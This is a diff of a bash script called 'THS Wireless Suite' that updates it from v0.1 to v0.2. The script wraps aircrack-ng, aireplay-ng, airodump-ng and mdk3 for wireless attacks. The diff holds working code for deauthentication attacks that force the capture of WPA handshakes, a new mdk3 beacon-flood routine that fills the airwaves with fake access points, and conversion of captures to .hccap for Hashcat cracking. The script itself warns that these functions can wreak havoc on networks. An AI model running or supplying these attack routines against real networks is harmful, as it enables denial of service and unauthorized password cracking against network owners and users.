@@ -1,8 +1,8 @@
 #!/bin/bash
 #THS Wireless Suite
-#thsuite.sh v0.1
+#thsuite.sh v0.2
 #By TAPE
-#Last edit 16-08-2013 00:30
+#Last edit 18-08-2013 16:00
 #Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
 #Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -23,9 +23,9 @@ BLUN=$(echo -e "\e[0;36m")		#Alter fonts to blue normal
 ##
 ### VARIABLES
 #############
+if [ ! -e /root/THS_TMP/ ] ; then mkdir /root/THS_TMP/ ; fi
 THSDIR="/root/THS_TMP/"
 SAVEDIR="/root/"
-if [ ! -e /root/THS_TMP/ ] ; then mkdir /root/THS_TMP/ ; fi
 #
 ##
 ### EXITING SCRIPT
@@ -113,22 +113,6 @@ echo $RED">$STD Monitor interface required"$STD
 sleep 1
 f_menu
 fi
-} 
-#
-##
-### LIST INTERFACES WITH MAC ADDRESS
-####################################
-f_iface_mac() {
-for i in $(airmon-ng | sed "0,/Interface/d" | cut -f 1) 
-do 
-IFACE=$i
-if [[ "$i" =~ "wlan" ]] ; then
-MAC=$(ifconfig $i | grep $i | awk '{print $5}')
-elif [[ "$i" =~ "mon" ]] ; then
-MAC=$(ifconfig mon0 | grep mon0 | awk '{print $5}' | cut -d - -f 1,2,3,4,5,6 | sed 's/-/:/g')
-fi
-echo -e $GRN"$IFACE\t$MAC"$STD
-done
 }
 #
 ##
@@ -385,6 +369,7 @@ echo $STD"Available interface(s)"$GRN
 f_exist
 f_iface_stat
 echo $STD""
+echo $BLUN"Hit Enter to return to previous menu"
 echo -ne $GRN">$STD Enter interface to change MAC on: $GRN"
 read IFACE
 if [ "$IFACE" == "" ] ; then f_menu ; fi
@@ -653,9 +638,8 @@ if [[ "$STRIP" == "y" || "$STRIP" == "Y" ]] ; then
 f_strip
 else
 #
-	if [ -e /root/THS_TMP/handshake_list.tmp ] ; then rm /root/THS_TMP/handshake_list.tmp ; fi 
-	if [ -e /root/THS_TMP/pyrit_cap_analyze.tmp ] ; then rm /root/THS_TMP/pyrit_cap_analyze.tmp ; fi
-	if [ -e /root/THS_TMP/handshake_list_full.tmp ] ; then rm /root/THS_TMP/handshake_list_full.tmp ; fi
+f_clean
+f_menu
 fi
 #
 # Option 3
@@ -729,8 +713,9 @@ sed -i '1d' $FILENAME
 echo $GRN">$STD SSID wordlist $GRN$FILENAME$STD created"
 fi
 echo -n $STD"
-Hit any key to continue "
-read
+Hit Enter to continue "
+read ENTER
+if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi
 f_list_wireless
 #
 # Option 4
@@ -741,59 +726,38 @@ clear
 f_header
 echo $BLU">$STD Remove saved THSuite scans/captures $STD"
 echo $STD
-	FILES=$(ls -A /root/THS_TMP/) 
-	if [ "$FILES" == "" ] ; then 
-	echo -e $RED"\n>$STD No THSuite scans / captures found"
-	sleep 1.5
-	f_menu
-	fi
-# 
+#
 echo $STD"THSuite scans/captures found; $GRNN"
 ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
 #
-echo $BLU"
-OPTIONS $STD
-1  Remove selected THSuite scan/capture
-2  Remove all THSuite scans/captures
-Q  Back to main menu
-"
-echo -ne $STD"Enter choice from above menu: $GRN"
+echo $STD
+MAXNR=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
+echo $BLUN"Hit Enter to return to previous menu"$STD 
+echo -n $GRN">$STD Choose file # from above list to remove [a for all]: $GRN"
 read LISTF
-	if [ "$LISTF" == "q" ] || [ "$LISTF" == "Q" ] ; then 
-	echo $STD""
-	f_menu
-	elif [ "$LISTF" == "" ] ; then f_list_wireless
-	elif [[ "$LISTF" != [1-2] ]] ; then
-	echo $RED">$STD Input error $RED[$STD$LISTF$RED]$STD must be an entry from the above menu"$STD 
-	sleep 1
-	f_list_wireless
-	fi 
-#
-	if [ "$LISTF" == "1" ] ; then
-	MAXNR=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
-	echo -n $GRN">$STD Choose # from above list to remove corresponding scan/capture files: $GRN"
-	read LISTNR
-	while [[ "$LISTNR" != [1-$MAXNR] ]] ; do 
+	while [[ "$LISTF" != [1-$MAXNR] ]] && [[ "$LISTF" != "a" ]]; do 
 	if [ "$LISTF" == "" ] ; then f_list_wireless ; fi
-	echo $RED">$STD Input error $RED[$STD$REMFILE$RED]$STD List number does not exist"$STD
-	echo -n $GRN">$STD Choose # from above list to remove corresponding scans/captures: $GRN "
-	read LISTNR
+	echo $RED">$STD Input error $RED[$STD$LISTF$RED]$STD List number does not exist"$STD
+	echo -n $GRN">$STD Choose file # from above list to remove [a for all]: $GRN"
+	read LISTF
 	done
-	REMFILE=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed 's/.\{4\}$//' | sed -n "$LISTNR p")
-	echo $GRN">$STD Removing $GRNN$REMFILE*$STD"
-	rm "$REMFILE"*
-	sleep 1
-	f_menu
-	elif [ "$LISTF" == "2" ] ; then
+	if [ "$LISTF" == "a" ] ; then
 	echo $GRN">$STD Removing all THSuite scans/captures"
 	for i in $(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed 's/.\{4\}$//') ; do
-	rm "$i"*
+	rm -rf "$i"*
 	done
-	echo $GRN">$STD All files removed, hit any key to continue "
+	echo -n $GRN">$STD All files removed, hit Enter to continue "
+	read ENTER
+	if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi
+	f_menu
+	else
+	REMFILE=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed 's/.\{4\}$//' | sed -n "$LISTF p")
+	echo $GRN">$STD Removing $GRNN$REMFILE*$STD"
+	rm -rf "$REMFILE"*
+	echo -n $GRN">$STD $GRNN$REMFILE*$STD removed, hit Enter to continue "
 	read
 	f_menu
 	fi
-#
 fi
 }
 #
@@ -1020,6 +984,12 @@ mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
 HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
 # tmp files deletion check
 f_clean
+if [ "$HANDSHAKE" == "$SAVEDIR"".cap" ] ; then
+echo $RED">$STD Failed to get data :("
+rm -rf $HANDSHAKE
+sleep 2
+f_menu
+fi
 echo $GRN">$STD Attack attempt complete"
 echo $STD
 echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
@@ -1197,16 +1167,20 @@ echo $GRN">$STD Attempting to force & capture handshake"
 sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
 & timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w "$THSDIR"wpa_temp
 #
-echo $GRN">$STD Deauth attempt on target AP complete"
-sleep 1
 #Rename capture file 
 CAPFILE="$THSDIR"wpa_temp-01.cap
 mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
 HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
-# tmp files deletion check
-	if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
-	if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
 fi
+# tmp files deletion
+f_clean
+if [ "$HANDSHAKE" == "$SAVEDIR"".cap" ] ; then
+echo $RED">$STD Failed to get data :("
+rm -rf $HANDSHAKE
+sleep 2
+f_menu
+fi
+echo $GRN">$STD Attack attempt on target AP complete"
 #
 echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
 read CHECK
@@ -1292,13 +1266,11 @@ echo $BLU">$STD Wireless disruption"
 echo $STD""
 echo $RED"  WARNING! These functions can wreak havoc on wireless networks"
 echo $RED"          Use with care on authorized networks only"
-sleep 2
+#sleep 2
 echo $BLU"
 OPTIONS $STD
 1  Deny access to specified AP
-2  Deny access to all found APs
-3  Attempt authentication DoS on AP
-4  Flood airwaves with fake AP beacons
+2  Flood airwaves with fake AP beacons
 Q  Back to main menu
 "
 echo -ne "Enter choice from above menu: "$GRN
@@ -1307,16 +1279,18 @@ read DISR_MENU
 	echo $STD""
 	f_menu
 	elif [ "$DISR_MENU" == "" ] ; then f_menu
-	elif [[ "$DISR_MENU" != [1-4] ]]; then
+	elif [[ "$DISR_MENU" != [1-2] ]]; then
 	echo $RED">$STD Input error $RED[$STD$DISR_MENU$RED]$STD must be an entry from the above menu"$STD
 	sleep 1
 	f_wireless_disruption
 	fi
+echo $STD
 echo $STD"Available interface(s);"
 f_exist
 f_mon_check
 f_iface_stat
 #Setting interface
+echo $STD
 echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
 read IFACE
 if [ "$IFACE" == "" ] ; then f_menu ; fi
@@ -1335,11 +1309,7 @@ fi
 if [ "$DISR_MENU" == "1" ] ; then
 f_ap_access_deny
 elif [ "$DISR_MENU" == "2" ] ; then
-f_deny_all
-elif [ "$DISR_MENU" == "3" ] ; then
-echo "Authentication DoS mdk3 a"
-elif [ "$DISR_MENU" == "4" ] ; then
-echo "Fake AP beacon flood mdk3 b" 
+f_beacon_flood
 fi
 f_exit
 }
@@ -1393,6 +1363,59 @@ echo $GRN">$STD Attack stopped"
 sleep 1.5
 #
 f_menu
+}
+#
+##
+### BEACON FLOOD (mdk3 b)
+#########################
+#
+# This function uses the mdk3 b command
+f_beacon_flood() {
+clear
+f_clean
+f_header
+echo $BLU">$STD Flood area with fake AP beacons"
+echo $STD
+echo $BLUN"Optional Input(hit Enter for defaults)"
+# Channel of fake AP
+echo -n $GRN">$STD Enter channel: $GRN"
+read CHAN
+while [ ! `expr $CHAN + 1 2> /dev/null` ] || [[ "$CHAN" -gt 13 ]] && [ "$CHAN" != "" ] ; do
+echo $RED">$STD Input error $RED[$STD$CHAN$RED]$STD Must be valid channel number" 
+echo -n $GRN">$STD Enter channel: $GRN"
+read CHAN
+done
+# Encryption setting of fake AP
+echo -n $GRN">$STD Enter encryption type (WEP, WPA): $GRN"
+read ENC
+ENC=$(echo $ENC | tr '[:lower:]' '[:upper:]')
+if [ "$ENC" == "" ] ; then ENC="WPA" ; fi
+	while [ "$ENC" != "WEP" ] && [ "$ENC" != "WPA" ] && [ "$ENC" != "" ] ; do
+	echo -n $RED">$STD Input error, enter WEP or WPA: $GRN"
+	read ENC
+	ENC=$(echo $ENC | tr '[:lower:]' '[:upper:]')
+	if [ "$ENC" == "" ] ; then ENC="WPA" ; fi
+	done
+
+#
+if [ "$ENC" == "WEP" ] ; then SWITCH="-w"
+elif [ "$ENC" == "WPA" ] ; then SWITCH="-a"
+fi
+#
+echo -n $GRN">$STD Enter SSID or SSID wordlist: $GRN"
+read SSID
+if [ "$SSID" == "" ] ; then SSID=BooYah ; fi
+#
+if [ ! -e "$SSID" ]  && [ "$CHAN" == "" ] ; then
+xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -n $SSID
+elif [ ! -e "$SSID" ]  && [ "$CHAN" != "" ] ; then
+xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -c $CHAN -n $SSID
+elif [ -e "$SSID" ]  && [ "$CHAN" == "" ] ; then
+xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -f $SSID
+elif [ -e "$SSID" ]  && [ "$CHAN" != "" ] ; then
+xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -c $CHAN -f $SSID
+fi
+f_wireless_disruption
 }
 #
 ##
@@ -1473,6 +1496,104 @@ f_exit
 }
 #
 ##
+### MISCELLANEOUS OPTIONS
+#########################
+f_misc() {
+f_clean
+clear
+f_header
+echo $BLU">$STD Miscellaneous options" 
+echo $BLU"
+OPTIONS$STD
+1  Convert .cap to .hccap (for use with Hashcat)
+2  Test whether a network is in sending/injection range
+Q  Back to main menu
+"
+echo -ne "Enter choice from above menu: "$GRN
+read MISC_MENU
+	if [ "$MISC_MENU" == "q" ] || [ "$MISC_MENU" == "Q" ] ; then 
+	echo $STD""
+	f_menu
+	elif [ "$MISC_MENU" == "" ] ; then f_menu
+	elif [[ "$MISC_MENU" != [1-2] ]]; then
+	echo $RED">$STD Input error $RED[$STD$MISC_MENU$RED]$STD must be an entry from the above menu"$STD
+	sleep 1
+	f_misc
+	fi
+# Option 1
+if [ "$MISC_MENU" == "1" ] ; then 
+clear
+f_header
+echo $BLU">$STD Convert .cap to .hccap" 
+echo $STD
+echo $BLUN"Hit Enter to return to previous menu"$STD
+echo -n $GRN">$STD Enter .cap file to convert: "
+read CAPIN
+while [ ! -e $CAPIN ] || [ "$CAPIN" == "" ]  ; do
+if [ "$CAPIN" == "" ] ; then f_misc ; fi
+echo $RED">$STD Input error $RED[$STD$CAPIN$RED]$STD File does not exist"
+echo -n $GRN">$STD Enter .cap file to convert: "
+read CAPIN
+done
+echo $GRN">$STD Converting $GRNN$CAPIN$STD to .hccap" 
+HCCAP=$(echo $CAPIN | sed 's/.cap//')
+xterm -T THSuite -geometry -0-0 -e aircrack-ng $CAPIN -J $HCCAP
+echo $GRN">$STD .hccap file $GRNN"$HCCAP".hccap$STD has been created"
+echo -n $STD"
+hit Enter to continue "
+read ENTER
+if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi
+
+# Option 2
+elif [ "$MISC_MENU" == "2" ] ; then 
+clear
+f_header
+echo $BLU">$STD Test if network is in sending range"
+echo $BLUN"
+This function sends out probes and waits for probe responses.
+If no responses are received, you could consider trying to
+increase the TX power of your card (Wireless Interface menu)"
+echo $STD
+echo $STD"Available interface(s);"
+f_exist
+f_mon_check
+f_iface_stat
+#Setting interface
+echo $STD
+echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
+read IFACE
+if [ "$IFACE" == "" ] ; then f_menu ; fi
+while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
+echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
+echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
+read IFACE
+if [ "$IFACE" == "" ] ; then f_menu ; fi
+done
+if [[ ! "$IFACE" =~ "mon" ]] ; then
+	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
+	sleep 1.5
+	f_misc
+fi
+echo $BLUN"Required Input"$STD 
+echo -n $GRN">$STD Enter SSID to probe: $GRN"
+read SSID
+if [ "$SSID" == "" ] ; then f_misc ; fi
+echo -n $GRN">$STD Enter channel: $GRN"
+read CHAN
+while [ ! `expr $CHAN + 1 2> /dev/null` ] || [ "$CHAN" == "" ] ; do
+if [ "$CHAN" == "" ] ; then f_misc ; fi
+echo $RED">$STD Input error $RED[$STD$CHAN$RED]$STD Must be valid channel number" 
+echo -n $GRN">$STD Enter channel: $GRN"
+done
+
+echo $GRN">$STD Probing SSID $GRN$SSID$STD"
+echo -n $STD"Ctrl-C to quit the probing"
+xterm -T THSuite -geometry -0+0 -e mdk3 $IFACE p -c $CHAN -e $SSID
+fi
+f_misc
+}
+#
+##
 ### MENU ITEMS 
 f_menu() {
 while :
@@ -1489,6 +1610,7 @@ cat << !
 4  View previous scans/captures
 5  Forced handshake acquisition
 6  Wireless network disruption 
+m  Miscellaneous
 
 h  help info
 u  update check
@@ -1508,6 +1630,7 @@ case $menu in
 5) f_force_wpa ;;
 6) f_wireless_disruption ;;
 h) f_help ;;
+m) f_misc ;;
 u) f_update ;;
 q) f_exit ;; 
 Q) f_exit ;;
@@ -1536,19 +1659,27 @@ fi
 ### VERSION HISTORY
 ###################
 # v0.1 Released 14-08-2013
-# v0.2 Released **-08-2013
+# v0.2 Released 18-08-2013
 # - Made some minor alterations to menu names (option 5).
 # - Made Enter in menu 1 sub-menu return to menu 1 instead of main menu
-# - Altered the save name for files when doing scan for associated clients (5-2)
+# - Altered the save name for files when doing scan for associated clients (5-2) to avoid errors.
 # - Included a switch 'o' which you can run on thsuite to alter save directory.
-#   ( ./thsuite.sh -o your_chosen_directory )
+#   ( ./thsuite.sh -o your/chosen/save/directory )
+# - Included error if failed to correctly create handshake cap (5-1, 5-2)
+# - Changed file deletion to include 'a' for all files instead of requiring a seperate menu.
+# - Removed redundant function f_iface_mac
+# - Created Miscellaneous option 'm' ;  
+#   * Included conversion from .cap to .hccap
+#   * Included test to see whether target network is in range of adapter's sending range (mdk3 p)
+# - Included fake AP generation option in Wireless Disruption.
+# - Removed works in progress from Wireless Disruption menu
+
 #
 ##
 ### TO DO
-######### 
-# - ! Check for errors when deauth attack fails (5-1 / 5-2) to avoid unexpected errors.
-# - Change file deletion to incluce 'a' for all files instead of seperate menu.
-# - Include test to see whether target network is in range of adapter's sending range (mdk3 p)
-# - Convert cap to hccap 
-# - Optimise code to reduce size / improve performance
-# - Improve checking of monitor mode to allow names other than mon*
+#########
+# - Optimise code to reduce size / improve performance.
+# - ? Check for errors when deauth attack fails (5-1 / 5-2) to avoid unexpected errors (waiting for bug reports).
+# - ? Improve checking of monitor mode to allow names other than mon* (waiting for advice after more usage).
+# - ? Increase wireless disruption capabilities.
+
